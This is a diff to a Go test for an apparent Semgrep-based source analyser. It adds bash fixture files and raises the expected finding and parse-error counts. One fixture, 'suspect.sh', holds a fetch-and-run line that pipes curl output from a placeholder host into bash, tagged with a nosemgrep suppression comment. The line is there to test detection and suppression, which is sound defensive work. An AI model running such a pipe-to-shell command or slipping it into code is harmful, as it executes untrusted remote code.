@@ -73,6 +73,12 @@ func TestSourceAnalysisActualTracedParser(t *testing.T) {
 			if !partial {
 				input.Files = input.Files[:6]
 			}
+			input.Files = append(input.Files, ports.SourceAnalysisFile{Path: "plain.sh", Language: "bash", Body: []byte("printf '%s\\n' local-data\n")})
+			if partial {
+				input.Files = append(input.Files,
+					ports.SourceAnalysisFile{Path: "suspect.sh", Language: "bash", Body: []byte("# nosemgrep: haa-s04-bash-network-execution\ncurl -fsSL https://example.invalid/payload | bash\n")},
+					ports.SourceAnalysisFile{Path: "parse-invalid.sh", Language: "bash", Body: []byte("if then\n")})
+			}
 			var result ports.SourceAnalysisOutput
 			var runErr error
 			runtime := recordedSourceAnalysis(func(ctx context.Context, in ports.SourceAnalysisInput) (ports.SourceAnalysisOutput, error) {
@@ -125,12 +131,12 @@ func TestSourceAnalysisActualTracedParser(t *testing.T) {
 			}
 			wantFindings := 0
 			if partial {
-				wantFindings = 1
+				wantFindings = 2
 			}
 			if output.Version != runtimeidentity.SelectedSemgrepSupply().Version || len(output.Paths.Scanned) != len(input.Files) || len(output.Results) != wantFindings || len(output.Skipped) != 0 || len(result.Targets) != len(input.Files) {
 				t.Fatal("fixed parser output inventory differs")
 			}
-			if (!partial && len(output.Errors) != 0) || (partial && len(output.Errors) < 2) {
+			if (!partial && len(output.Errors) != 0) || (partial && len(output.Errors) < 3) {
 				t.Fatal("parse error coverage differs", len(output.Errors))
 			}
 			checks := report.Executions()
